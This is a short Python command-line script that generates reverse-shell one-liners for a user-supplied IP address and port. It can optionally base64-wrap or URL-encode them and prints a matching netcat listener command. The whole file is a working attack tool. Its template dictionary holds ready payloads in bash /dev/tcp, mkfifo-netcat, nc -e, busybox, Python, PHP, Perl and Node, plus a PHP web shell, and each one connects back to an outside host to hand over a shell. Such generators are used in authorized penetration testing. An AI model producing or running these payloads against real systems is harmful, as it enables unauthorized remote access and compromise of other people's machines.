#!/usr/bin/env python3
"""Print reverse-shell one-liners for IP/PORT (+ URL-encoded and base64-wrapped).

    python revshell.py 10.0.0.5 443
    python revshell.py 10.0.0.5 443 --only bash --urlencode
"""
import argparse
import base64
from urllib.parse import quote

T = {
    "bash": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    "bash-b64": "echo {b64} | base64 -d | bash",
    "mkfifo-nc": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "nc-e": "nc -e /bin/sh {ip} {port}",
    "busybox": "busybox nc {ip} {port} -e sh",
    "python3": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"sh\")'",
    "php": "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"sh <&3 >&3 2>&3\");'",
    "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");'",
    "node": "node -e 'sh=require(\"child_process\").spawn(\"sh\");c=require(\"net\").connect({port},\"{ip}\",()=>{{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)}})'",
    "php-webshell-file": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); ?>",
}


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("ip")
    ap.add_argument("port", type=int)
    ap.add_argument("--only")
    ap.add_argument("--urlencode", action="store_true")
    a = ap.parse_args()
    b64 = base64.b64encode(f"bash -i >& /dev/tcp/{a.ip}/{a.port} 0>&1".encode()).decode()
    print(f"# listener:  sudo nc -lvnp {a.port}   (or rlwrap nc -lvnp {a.port})\n")
    for name, t in T.items():
        if a.only and a.only != name:
            continue
        cmd = t.format(ip=a.ip, port=a.port, b64=b64)
        print(f"[{name}]\n{cmd}")
        if a.urlencode:
            print(f"  urlenc: {quote(cmd, safe='')}")
        print()


if __name__ == "__main__":
    main()
